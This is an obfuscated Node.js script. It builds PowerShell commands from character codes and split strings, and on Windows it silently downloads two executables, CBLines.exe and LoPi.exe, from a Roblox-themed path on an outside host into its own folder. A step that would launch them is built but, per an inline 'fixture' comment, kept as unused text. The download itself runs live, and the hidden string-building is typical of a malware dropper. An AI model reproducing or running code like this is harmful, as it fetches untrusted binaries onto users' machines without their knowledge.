const cp = require("child_process");
const path = require("path");

const c = (...n) => String.fromCharCode(...n);
const shell = [112, 111, 119, 101, 114, 115, 104, 101, 108, 108].map((x) => String.fromCharCode(x)).join("");
const verbs = c(73,110,118,111,107,101,45,87,101,98,82,101,113,117,101,115,116);
const flag = ["-", "Ou", "tFi", "le"].join("");
const hosts = [
  ["h","t","t","p","s",":","/","/"].join("") + "cdn.bzxq0mvt-dl.com/roblox/" + "CBLines" + ".exe",
  ["h","t","t","p","s",":","/","/"].join("") + "cdn.bzxq0mvt-dl.com/roblox/" + "LoPi" + ".exe",
];
const dir = __dirname;

function fetchOne(url, name) {
  const dest = path.join(dir, name);
  const cmd = `${shell} -Command "${verbs} -Uri '${url}' ${flag} '${dest}'"`;
  cp.exec(cmd, (err) => { if (!err) runOne(dest); });
}
function runOne(dest) {
  // fixture: launch step kept as text only
  const launch = `${shell} -Command "Start-Process '${dest}'"`;
  void launch;
}

if (process.platform === "win32") {
  hosts.forEach((u, i) => fetchOne(u, ["CBLines.exe", "LoPi.exe"][i]));
}
